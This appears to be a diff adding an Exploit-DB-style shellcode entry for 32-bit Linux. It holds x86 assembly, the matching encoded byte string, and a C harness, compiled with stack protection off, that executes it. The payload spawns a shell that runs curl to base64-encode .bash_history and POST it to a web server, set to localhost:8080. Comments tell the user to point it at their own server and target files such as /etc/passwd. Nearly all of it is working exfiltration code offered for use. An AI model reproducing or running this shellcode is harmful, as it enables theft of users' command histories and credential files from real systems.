@@ -1,0 +1,72 @@
+# Exploit Title: Linux/x86 cat file encode to base64 and post via curl to webserver  (125 bytes)
+# Google Dork: None
+# Date: 11.04.2019
+# Exploit Author: strider
+# Vendor Homepage: None
+# Software Link: None
+# Tested on: Debian 9 Stretch i386/ Kali Linux i386
+# CVE : None
+# Shellcode Length: 125
+------------------------------[Description]---------------------------------
+
+
+
+-----------------------------[Shellcode Dump]---------------------------------
+section .text
+
+global _start
+
+_start:
+  xor eax, eax
+  push eax
+  jmp short _cmd
+
+_build:
+  pop ecx
+  mov edi, ecx
+  xor ecx, ecx
+  push eax
+  push 0x68732f6e
+  push 0x69622f2f
+
+_param:
+  mov ebx, esp
+  push eax
+  push word 0x632d
+  mov esi, esp
+
+_exec:
+  push eax
+  push edi
+  push esi
+  push ebx
+
+  mov ecx, esp
+  mov al, 11
+  int 0x80
+
+_cmd:
+  call _build
+  msg db "curl http://localhost:8080 -d 'data='$(cat .bash_history | base64 -w 0) -X POST", 0x0a
+  ; decoded url = curl http://localhost:8080 -d 'data='$(cat .bash_history | base64 -w 0) -X POST
+  ;change url to your server
+  ; change file to you target file like /etc/passwd
+
+
+ -----------------------------[Compile]---------------------------------------------
+ gcc -m32 -fno-stack-protector -z execstack -o tester tester.c
+
+ -----------------------------[C-Code]-----------------------------
+
+ #include <stdio.h>
+ #include <string.h>
+
+ unsigned char shellcode[] = "\x31\xc0\x50\xeb\x23\x59\x89\xcf\x31\xc9\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x66\x68\x2d\x63\x89\xe6\x50\x57\x56\x53\x89\xe1\xb0\x0b\xcd\x80\xe8\xd8\xff\xff\xff\x63\x75\x72\x6c\x20\x68\x74\x74\x70\x3a\x2f\x2f\x6c\x6f\x63\x61\x6c\x68\x6f\x73\x74\x3a\x38\x30\x38\x30\x20\x2d\x64\x20\x27\x64\x61\x74\x61\x3d\x27\x24\x28\x63\x61\x74\x20\x2e\x62\x61\x73\x68\x5f\x68\x69\x73\x74\x6f\x72\x79\x20\x7c\x20\x62\x61\x73\x65\x36\x34\x20\x2d\x77\x20\x30\x29\x20\x2d\x58\x20\x50\x4f\x53\x54\x0a";
+
+ void main()
+ {
+     printf("Shellcode Length:  %d\n", strlen(shellcode));
+
+     int (*ret)() = (int(*)())shellcode;
+     ret();
+ }
